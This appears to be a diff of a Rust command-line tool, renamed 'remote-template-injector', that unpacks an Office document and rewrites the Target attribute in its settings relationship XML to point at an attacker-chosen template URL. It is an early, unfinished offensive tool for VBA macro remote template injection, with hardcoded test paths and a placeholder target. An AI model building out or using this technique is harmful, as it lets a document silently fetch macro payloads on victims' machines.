@@ -1,15 +1,18 @@
+
 use clap::Parser;
 use std::io::prelude::*;
 use std::path::{Path, PathBuf};
-use std::{env, fs, io};
+use std::{env, fs, fs::File, io, io::BufReader};
+use xmltree::*;
+
 use zip::result::ZipResult;
 use zip::{ZipArchive, ZipWriter};
 
 #[derive(Parser)]
-#[clap(name = "pwsh-b64-rs")]
+#[clap(name = "remote-template-injector")]
 #[clap(author = "Petruknisme <me@petruknisme.com>")]
 #[clap(version = "1.0")]
-#[clap(about = "Powershell implementation of ToBase64String UTF-16LE written in Rust", long_about = None)]
+#[clap(about = "VBA Macro Remote Template Injection written in Rust", long_about = None)]
 
 struct Cli {
     /// Template URL
@@ -20,6 +23,30 @@ struct Cli {
     #[clap(short, long)]
     file: String,
 }
+
+
+fn edit_xml_file(file_path: &str, new_target: &str)  {
+
+    // Find the Relationship element and update the value of the Target attribute
+
+    let cfg = EmitterConfig {
+        perform_indent: true,
+        ..EmitterConfig::default()
+    };
+
+    // Parse the XML string into an Element tree
+    let mut root = Element::parse(File::open(file_path).unwrap()).unwrap();
+
+    let name = root.get_mut_child("Relationship").unwrap();
+    name.attributes.insert("Target".to_string(), new_target.to_string());
+    
+    let mut buf = Vec::new();
+    root.write_with_config(&mut buf, cfg).unwrap();
+
+    let s = String::from_utf8(buf).unwrap();
+    fs::write(file_path, s).unwrap();
+}
+
 
 fn unzip(zipfile: &str, dest_dir: &str) -> ZipResult<()> {
     let file = fs::File::open(zipfile)?;
@@ -71,14 +98,27 @@ fn zip_dir(dir: &Path, zip: &mut ZipWriter<std::fs::File>, prefix: &Path) -> Zip
     Ok(())
 }
 
-fn main() {
+fn main() -> io::Result<()>{
     //let current_dir = env::current_dir().unwrap();
     //let current_dir_path = current_dir.as_path();
 
-     let zipfile = "/tmp/test2/twrp.zip";
+/*     let zipfile = "/tmp/test2/twrp.zip";
     let dest_dir = "/tmp/test2/";
 
-    unzip(zipfile, dest_dir).unwrap(); 
+    unzip(zipfile, dest_dir).unwrap();  */
+
+    let xmlout = "/tmp/test2/settings-new.xml";
+
+    let file_path = "/tmp/test2/settings.xml";
+    let new_target = "file:///new_target.dotx";
+    edit_xml_file(file_path, new_target);
+/*     match edit_xml_file(file_path, new_target) {
+        Err(e) => println!("{:?}", e),
+        _ => ()
+    } */
+    //edit_xml_file(file_path, new_target);
+
+    Ok(())
 
     /* let dir = Path::new("/tmp/test2/twrp");
     let zipfile = "/tmp/test2/twrp2.zip";
